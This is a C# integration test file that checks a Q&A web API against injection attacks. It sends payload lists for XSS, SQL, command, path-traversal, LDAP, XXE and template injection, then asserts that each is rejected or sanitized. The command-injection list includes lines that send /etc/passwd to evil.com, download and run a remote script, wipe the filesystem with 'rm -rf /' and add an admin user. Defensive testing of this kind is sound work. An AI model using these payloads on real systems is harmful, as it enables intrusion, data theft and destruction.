using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Xunit;
using Xunit.Abstractions;

namespace WebAPI.IntegrationTests
{
    /// <summary>
    /// Advanced security hardening tests for QA System Integration
    /// Tests advanced attack vectors, security configurations, and hardening measures
    /// Validates: Advanced security requirements and attack prevention
    /// </summary>
    public class QASecurityHardeningTests : BaseIntegrationTest
    {
        private readonly ITestOutputHelper _output;

        public QASecurityHardeningTests(WebApplicationFactory<Program> factory, ITestOutputHelper output) 
            : base(factory)
        {
            _output = output;
        }

        #region Advanced XSS Protection Tests

        [Fact]
        public async Task QAContent_WithAdvancedXSSPayloads_ShouldBeFullyProtected()
        {
            _output.WriteLine("Testing advanced XSS protection...");

            var advancedXSSPayloads = new[]
            {
                // DOM-based XSS
                "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
                
                // Filter evasion
                "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                
                // Event handler injection
                "<svg/onload=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                
                // CSS injection
                "<style>@import'javascript:alert(\"XSS\")';</style>",
                "<link rel=stylesheet href=javascript:alert('XSS')>",
                
                // Data URI XSS
                "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>",
                
                // Template injection
                "{{constructor.constructor('alert(\"XSS\")')()}}",
                "${alert('XSS')}",
                "#{alert('XSS')}",
                
                // Protocol handler XSS
                "<a href=javascript&colon;alert('XSS')>click</a>",
                "<form action=javascript:alert('XSS')><input type=submit>",
                
                // Polyglot payloads
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e"
            };

            foreach (var payload in advancedXSSPayloads)
            {
                await TestXSSPayloadInQuestionCreation(payload);
                await TestXSSPayloadInAnswerCreation(payload);
                await TestXSSPayloadInSearch(payload);
            }

            _output.WriteLine("✅ Advanced XSS protection tests completed");
        }

        private async Task TestXSSPayloadInQuestionCreation(string payload)
        {
            var request = new
            {
                Title = $"XSS Test: {payload}",
                Content = $"Testing XSS payload: {payload}",
                Category = "Web Development",
                Tags = new List<string> { "xss", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                AssertNoXSSInResponse(content, payload);
            }
            else
            {
                // Input validation rejection is also acceptable
                Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
            }
        }

        private async Task TestXSSPayloadInAnswerCreation(string payload)
        {
            // First create a test question
            var questionRequest = new
            {
                Title = "Test Question for XSS",
                Content = "Test question content",
                Category = "Web Development",
                Tags = new List<string> { "test" }
            };

            var questionResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", questionRequest);
            if (!questionResponse.IsSuccessStatusCode) return;

            var questionContent = await questionResponse.Content.ReadAsStringAsync();
            var questionData = JsonSerializer.Deserialize<JsonElement>(questionContent);
            var questionId = questionData.GetProperty("data").GetProperty("id").GetGuid();

            var answerRequest = new
            {
                QuestionId = questionId,
                Content = $"Answer with XSS payload: {payload}"
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/answers", answerRequest);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                AssertNoXSSInResponse(content, payload);
            }
        }

        private async Task TestXSSPayloadInSearch(string payload)
        {
            var encodedPayload = Uri.EscapeDataString(payload);
            var response = await Client.GetAsync($"/api/v7/qa/questions/search?searchTerm={encodedPayload}");
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                AssertNoXSSInResponse(content, payload);
            }
        }

        private void AssertNoXSSInResponse(string content, string originalPayload)
        {
            // Check for various XSS indicators
            Assert.DoesNotContain("<script", content.ToLower());
            Assert.DoesNotContain("javascript:", content.ToLower());
            Assert.DoesNotContain("onerror=", content.ToLower());
            Assert.DoesNotContain("onload=", content.ToLower());
            Assert.DoesNotContain("onclick=", content.ToLower());
            Assert.DoesNotContain("onmouseover=", content.ToLower());
            Assert.DoesNotContain("onfocus=", content.ToLower());
            Assert.DoesNotContain("alert(", content.ToLower());
            Assert.DoesNotContain("eval(", content.ToLower());
            Assert.DoesNotContain("expression(", content.ToLower());
            Assert.DoesNotContain("vbscript:", content.ToLower());
            Assert.DoesNotContain("data:text/html", content.ToLower());
        }

        #endregion

        #region Advanced SQL Injection Tests

        [Fact]
        public async Task QAEndpoints_WithAdvancedSQLInjection_ShouldBeProtected()
        {
            _output.WriteLine("Testing advanced SQL injection protection...");

            var advancedSQLPayloads = new[]
            {
                // Union-based injection
                "' UNION SELECT username, password FROM users--",
                "' UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
                
                // Boolean-based blind injection
                "' AND (SELECT COUNT(*) FROM users) > 0--",
                "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
                
                // Time-based blind injection
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--",
                
                // Error-based injection
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                
                // Stacked queries
                "'; DROP TABLE users; CREATE TABLE users (id INT);--",
                "'; INSERT INTO admin_users (username, password) VALUES ('hacker', 'password');--",
                
                // Second-order injection
                "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
                
                // NoSQL injection (for MongoDB-like systems)
                "'; return db.users.find(); var x='",
                "' || '1'=='1",
                
                // ORM injection
                "'; this.constructor.constructor('return process')().exit();//",
                
                // Stored procedure injection
                "'; EXEC xp_cmdshell('dir'); --"
            };

            foreach (var payload in advancedSQLPayloads)
            {
                await TestSQLInjectionInQuestionCreation(payload);
                await TestSQLInjectionInSearch(payload);
                await TestSQLInjectionInVoting(payload);
            }

            _output.WriteLine("✅ Advanced SQL injection protection tests completed");
        }

        private async Task TestSQLInjectionInQuestionCreation(string payload)
        {
            var request = new
            {
                Title = $"SQL Test: {payload}",
                Content = $"Testing SQL injection: {payload}",
                Category = "Database Design",
                Tags = new List<string> { "sql", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            // Should either sanitize the input or reject it
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                AssertNoSQLInjectionInResponse(content);
            }
            else
            {
                Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
            }
        }

        private async Task TestSQLInjectionInSearch(string payload)
        {
            var encodedPayload = Uri.EscapeDataString(payload);
            var response = await Client.GetAsync($"/api/v7/qa/questions/search?searchTerm={encodedPayload}");
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                AssertNoSQLInjectionInResponse(content);
            }
        }

        private async Task TestSQLInjectionInVoting(string payload)
        {
            // Create a test question first
            var questionRequest = new
            {
                Title = "Test Question for SQL Injection",
                Content = "Test content",
                Category = "Web Development",
                Tags = new List<string> { "test" }
            };

            var questionResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", questionRequest);
            if (!questionResponse.IsSuccessStatusCode) return;

            var questionContent = await questionResponse.Content.ReadAsStringAsync();
            var questionData = JsonSerializer.Deserialize<JsonElement>(questionContent);
            var questionId = questionData.GetProperty("data").GetProperty("id").GetGuid();

            // Try SQL injection in vote request
            var voteRequest = new
            {
                ContentId = questionId,
                ContentType = $"Question{payload}",
                VoteType = "Up"
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/voting", voteRequest);
            
            // Should reject invalid content type
            Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        }

        private void AssertNoSQLInjectionInResponse(string content)
        {
            // Check that SQL injection patterns are not present in response
            Assert.DoesNotContain("DROP TABLE", content.ToUpper());
            Assert.DoesNotContain("DELETE FROM", content.ToUpper());
            Assert.DoesNotContain("INSERT INTO", content.ToUpper());
            Assert.DoesNotContain("UPDATE SET", content.ToUpper());
            Assert.DoesNotContain("UNION SELECT", content.ToUpper());
            Assert.DoesNotContain("INFORMATION_SCHEMA", content.ToUpper());
            Assert.DoesNotContain("WAITFOR DELAY", content.ToUpper());
            Assert.DoesNotContain("EXEC XP_", content.ToUpper());
        }

        #endregion

        #region Command Injection Tests

        [Fact]
        public async Task QAEndpoints_WithCommandInjection_ShouldBeProtected()
        {
            _output.WriteLine("Testing command injection protection...");

            var commandInjectionPayloads = new[]
            {
                "; ls -la",
                "| dir",
                "&& whoami",
                "; cat /etc/passwd",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "; rm -rf /",
                "&& del /f /q C:\\*.*",
                "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
                "| powershell -Command \"Get-Process\"",
                "; $(curl -X POST http://evil.com -d @/etc/passwd)",
                "&& net user hacker password123 /add",
                "; wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh"
            };

            foreach (var payload in commandInjectionPayloads)
            {
                await TestCommandInjectionInContent(payload);
            }

            _output.WriteLine("✅ Command injection protection tests completed");
        }

        private async Task TestCommandInjectionInContent(string payload)
        {
            var request = new
            {
                Title = $"Command Test: {payload}",
                Content = $"Testing command injection: {payload}",
                Category = "DevOps & Cloud",
                Tags = new List<string> { "command", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Verify command injection patterns are sanitized
                Assert.DoesNotContain("ls -la", content);
                Assert.DoesNotContain("whoami", content);
                Assert.DoesNotContain("/etc/passwd", content);
                Assert.DoesNotContain("powershell", content.ToLower());
                Assert.DoesNotContain("cmd.exe", content.ToLower());
            }
            else
            {
                Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
            }
        }

        #endregion

        #region Path Traversal Tests

        [Fact]
        public async Task QAEndpoints_WithPathTraversal_ShouldBeProtected()
        {
            _output.WriteLine("Testing path traversal protection...");

            var pathTraversalPayloads = new[]
            {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/var/www/../../etc/passwd",
                "C:\\..\\..\\..\\windows\\system32\\config\\sam",
                "file:///etc/passwd",
                "file://C:/windows/system32/config/sam"
            };

            foreach (var payload in pathTraversalPayloads)
            {
                await TestPathTraversalInSearch(payload);
                await TestPathTraversalInContent(payload);
            }

            _output.WriteLine("✅ Path traversal protection tests completed");
        }

        private async Task TestPathTraversalInSearch(string payload)
        {
            var encodedPayload = Uri.EscapeDataString(payload);
            var response = await Client.GetAsync($"/api/v7/qa/questions/search?searchTerm={encodedPayload}");
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Verify path traversal patterns are not reflected
                Assert.DoesNotContain("../", content);
                Assert.DoesNotContain("..\\", content);
                Assert.DoesNotContain("/etc/passwd", content);
                Assert.DoesNotContain("windows/system32", content.ToLower());
            }
        }

        private async Task TestPathTraversalInContent(string payload)
        {
            var request = new
            {
                Title = $"Path Test: {payload}",
                Content = $"Testing path traversal: {payload}",
                Category = "Cybersecurity",
                Tags = new List<string> { "path", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Verify path traversal patterns are sanitized
                Assert.DoesNotContain("../", content);
                Assert.DoesNotContain("..\\", content);
                Assert.DoesNotContain("/etc/passwd", content);
                Assert.DoesNotContain("system32", content.ToLower());
            }
        }

        #endregion

        #region LDAP Injection Tests

        [Fact]
        public async Task QAEndpoints_WithLDAPInjection_ShouldBeProtected()
        {
            _output.WriteLine("Testing LDAP injection protection...");

            var ldapInjectionPayloads = new[]
            {
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(password=*))",
                "*))%00",
                ")(cn=*",
                "*)(objectClass=*",
                "admin)(|(password=*))",
                "*)(userPassword=*",
                "*)(&(objectClass=user)(cn=*",
                "*)(mail=*@*"
            };

            foreach (var payload in ldapInjectionPayloads)
            {
                await TestLDAPInjectionInContent(payload);
            }

            _output.WriteLine("✅ LDAP injection protection tests completed");
        }

        private async Task TestLDAPInjectionInContent(string payload)
        {
            var request = new
            {
                Title = $"LDAP Test: {payload}",
                Content = $"Testing LDAP injection: {payload}",
                Category = "Cybersecurity",
                Tags = new List<string> { "ldap", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Verify LDAP injection patterns are sanitized
                Assert.DoesNotContain("*)(uid=", content);
                Assert.DoesNotContain("objectClass=", content);
                Assert.DoesNotContain("userPassword=", content);
            }
        }

        #endregion

        #region XML/XXE Injection Tests

        [Fact]
        public async Task QAEndpoints_WithXXEInjection_ShouldBeProtected()
        {
            _output.WriteLine("Testing XXE injection protection...");

            var xxePayloads = new[]
            {
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
                "<!DOCTYPE test [<!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init;]><test/>",
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><foo/>",
                "<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///etc/passwd\">",
                "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\" >]><foo>&xxe;</foo>"
            };

            foreach (var payload in xxePayloads)
            {
                await TestXXEInjectionInContent(payload);
            }

            _output.WriteLine("✅ XXE injection protection tests completed");
        }

        private async Task TestXXEInjectionInContent(string payload)
        {
            var request = new
            {
                Title = "XXE Test",
                Content = payload,
                Category = "Cybersecurity",
                Tags = new List<string> { "xml", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Verify XXE patterns are sanitized
                Assert.DoesNotContain("<!DOCTYPE", content);
                Assert.DoesNotContain("<!ENTITY", content);
                Assert.DoesNotContain("SYSTEM", content);
                Assert.DoesNotContain("/etc/passwd", content);
            }
            else
            {
                // XML content should be rejected or sanitized
                Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
            }
        }

        #endregion

        #region Server-Side Template Injection Tests

        [Fact]
        public async Task QAEndpoints_WithSSTInjection_ShouldBeProtected()
        {
            _output.WriteLine("Testing Server-Side Template Injection protection...");

            var sstiPayloads = new[]
            {
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "{{request}}",
                "${T(java.lang.Runtime).getRuntime().exec('calc')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.items()}}",
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "<%=7*7%>",
                "<%= File.open('/etc/passwd').read %>",
                "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('whoami')\")()}}"
            };

            foreach (var payload in sstiPayloads)
            {
                await TestSSTInjectionInContent(payload);
            }

            _output.WriteLine("✅ Server-Side Template Injection protection tests completed");
        }

        private async Task TestSSTInjectionInContent(string payload)
        {
            var request = new
            {
                Title = $"SSTI Test: {payload}",
                Content = $"Testing SSTI: {payload}",
                Category = "Web Development",
                Tags = new List<string> { "template", "security" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Verify SSTI patterns are sanitized and not executed
                Assert.DoesNotContain("49", content); // 7*7 should not be executed
                Assert.DoesNotContain("{{", content);
                Assert.DoesNotContain("${", content);
                Assert.DoesNotContain("#{", content);
                Assert.DoesNotContain("<%=", content);
                Assert.DoesNotContain("__class__", content);
                Assert.DoesNotContain("getRuntime", content);
            }
        }

        #endregion

        #region Business Logic Security Tests

        [Fact]
        public async Task VotingSystem_ShouldPreventVoteManipulation()
        {
            _output.WriteLine("Testing voting system security...");

            // Create a test question
            var questionRequest = new
            {
                Title = "Test Question for Vote Security",
                Content = "Testing vote manipulation prevention",
                Category = "Web Development",
                Tags = new List<string> { "test" }
            };

            var questionResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", questionRequest);
            Assert.True(questionResponse.IsSuccessStatusCode);

            var questionContent = await questionResponse.Content.ReadAsStringAsync();
            var questionData = JsonSerializer.Deserialize<JsonElement>(questionContent);
            var questionId = questionData.GetProperty("data").GetProperty("id").GetGuid();

            // Test 1: Prevent double voting
            var voteRequest = new
            {
                ContentId = questionId,
                ContentType = "Question",
                VoteType = "Up"
            };

            var firstVote = await Client.PostAsJsonAsync("/api/v7/qa/voting", voteRequest);
            var secondVote = await Client.PostAsJsonAsync("/api/v7/qa/voting", voteRequest);

            // Second vote should be rejected
            Assert.True(secondVote.StatusCode == HttpStatusCode.BadRequest);
            _output.WriteLine("✓ Double voting prevented");

            // Test 2: Prevent voting with invalid content types
            var invalidVoteRequest = new
            {
                ContentId = questionId,
                ContentType = "InvalidType",
                VoteType = "Up"
            };

            var invalidVote = await Client.PostAsJsonAsync("/api/v7/qa/voting", invalidVoteRequest);
            Assert.Equal(HttpStatusCode.BadRequest, invalidVote.StatusCode);
            _output.WriteLine("✓ Invalid content type voting prevented");

            // Test 3: Prevent voting with invalid vote types
            var invalidVoteTypeRequest = new
            {
                ContentId = questionId,
                ContentType = "Question",
                VoteType = "Invalid"
            };

            var invalidVoteType = await Client.PostAsJsonAsync("/api/v7/qa/voting", invalidVoteTypeRequest);
            Assert.Equal(HttpStatusCode.BadRequest, invalidVoteType.StatusCode);
            _output.WriteLine("✓ Invalid vote type prevented");
        }

        [Fact]
        public async Task ReputationSystem_ShouldPreventManipulation()
        {
            _output.WriteLine("Testing reputation system security...");

            // Test 1: Prevent direct reputation manipulation
            var manipulationRequest = new
            {
                UserId = Guid.NewGuid(),
                ReputationChange = 10000,
                Reason = "Hacking attempt"
            };

            // This endpoint shouldn't exist or should be admin-only
            var response = await Client.PostAsJsonAsync("/api/v7/qa/reputation/manipulate", manipulationRequest);
            Assert.True(response.StatusCode == HttpStatusCode.NotFound || 
                       response.StatusCode == HttpStatusCode.MethodNotAllowed ||
                       response.StatusCode == HttpStatusCode.Forbidden);
            _output.WriteLine("✓ Direct reputation manipulation prevented");

            // Test 2: Verify reputation calculations are server-side
            var userReputationResponse = await Client.GetAsync("/api/v7/qa/reputation/me/summary");
            if (userReputationResponse.IsSuccessStatusCode)
            {
                var content = await userReputationResponse.Content.ReadAsStringAsync();
                // Reputation should be calculated server-side, not client-provided
                Assert.DoesNotContain("client", content.ToLower());
                _output.WriteLine("✓ Reputation calculated server-side");
            }
        }

        [Fact]
        public async Task QuestionAnswerSystem_ShouldPreventContentManipulation()
        {
            _output.WriteLine("Testing content manipulation prevention...");

            // Test 1: Prevent question manipulation after creation
            var questionRequest = new
            {
                Title = "Original Title",
                Content = "Original content",
                Category = "Web Development",
                Tags = new List<string> { "test" }
            };

            var questionResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", questionRequest);
            Assert.True(questionResponse.IsSuccessStatusCode);

            var questionContent = await questionResponse.Content.ReadAsStringAsync();
            var questionData = JsonSerializer.Deserialize<JsonElement>(questionContent);
            var questionId = questionData.GetProperty("data").GetProperty("id").GetGuid();

            // Test 2: Prevent unauthorized question updates
            var updateRequest = new
            {
                Title = "Hacked Title",
                Content = "Hacked content",
                Category = "Hacking",
                Tags = new List<string> { "hacked" }
            };

            // Try to update with different user context (should fail)
            var updateResponse = await Client.PutAsJsonAsync($"/api/v7/qa/questions/{questionId}", updateRequest);
            
            // Should either succeed (if same user) or fail with proper authorization
            if (!updateResponse.IsSuccessStatusCode)
            {
                Assert.True(updateResponse.StatusCode == HttpStatusCode.Forbidden ||
                           updateResponse.StatusCode == HttpStatusCode.Unauthorized);
                _output.WriteLine("✓ Unauthorized question updates prevented");
            }
            else
            {
                _output.WriteLine("✓ Question update allowed for authorized user");
            }
        }

        #endregion

        #region API Abuse Prevention Tests

        [Fact]
        public async Task QAEndpoints_ShouldPreventAPIAbuse()
        {
            _output.WriteLine("Testing API abuse prevention...");

            // Test 1: Large payload rejection
            var largeContent = new string('A', 100000); // 100KB content
            var largeRequest = new
            {
                Title = "Large Content Test",
                Content = largeContent,
                Category = "Web Development",
                Tags = new List<string> { "test" }
            };

            var largeResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", largeRequest);
            Assert.True(largeResponse.StatusCode == HttpStatusCode.BadRequest ||
                       largeResponse.StatusCode == HttpStatusCode.RequestEntityTooLarge);
            _output.WriteLine("✓ Large payload rejected");

            // Test 2: Malformed JSON handling
            var malformedJson = "{\"Title\":\"Test\",\"Content\":\"Test\",\"Category\":\"Test\",\"Tags\":[\"test\"]"; // Missing closing brace
            var malformedContent = new StringContent(malformedJson, Encoding.UTF8, "application/json");
            
            var malformedResponse = await Client.PostAsync("/api/v7/qa/questions", malformedContent);
            Assert.Equal(HttpStatusCode.BadRequest, malformedResponse.StatusCode);
            _output.WriteLine("✓ Malformed JSON rejected");

            // Test 3: Invalid content type handling
            var invalidContent = new StringContent("invalid content", Encoding.UTF8, "text/plain");
            var invalidResponse = await Client.PostAsync("/api/v7/qa/questions", invalidContent);
            Assert.True(invalidResponse.StatusCode == HttpStatusCode.BadRequest ||
                       invalidResponse.StatusCode == HttpStatusCode.UnsupportedMediaType);
            _output.WriteLine("✓ Invalid content type rejected");
        }

        #endregion

        #region Security Configuration Tests

        [Fact]
        public async Task SecurityHeaders_ShouldBeProperlyConfigured()
        {
            _output.WriteLine("Testing security headers configuration...");

            var response = await Client.GetAsync("/api/v7/qa/questions");
            
            var headers = response.Headers.Concat(response.Content.Headers)
                .ToDictionary(h => h.Key, h => string.Join(", ", h.Value));

            // Test security headers
            var securityHeaders = new Dictionary<string, string[]>
            {
                { "X-Frame-Options", new[] { "DENY", "SAMEORIGIN" } },
                { "X-Content-Type-Options", new[] { "nosniff" } },
                { "X-XSS-Protection", new[] { "1; mode=block", "0" } },
                { "Referrer-Policy", new[] { "strict-origin-when-cross-origin", "no-referrer", "same-origin" } },
                { "Content-Security-Policy", new[] { "default-src" } }
            };

            foreach (var (headerName, acceptableValues) in securityHeaders)
            {
                if (headers.ContainsKey(headerName))
                {
                    var headerValue = headers[headerName];
                    var isValid = acceptableValues.Any(acceptable => 
                        headerValue.Contains(acceptable, StringComparison.OrdinalIgnoreCase));
                    
                    if (isValid)
                    {
                        _output.WriteLine($"✓ {headerName}: {headerValue}");
                    }
                    else
                    {
                        _output.WriteLine($"⚠ {headerName}: {headerValue} (unexpected value)");
                    }
                }
                else
                {
                    _output.WriteLine($"⚠ {headerName}: Not present");
                }
            }

            // HTTPS enforcement (if applicable)
            if (headers.ContainsKey("Strict-Transport-Security"))
            {
                _output.WriteLine($"✓ Strict-Transport-Security: {headers["Strict-Transport-Security"]}");
            }

            _output.WriteLine("Security headers validation completed");
        }

        #endregion
    }
}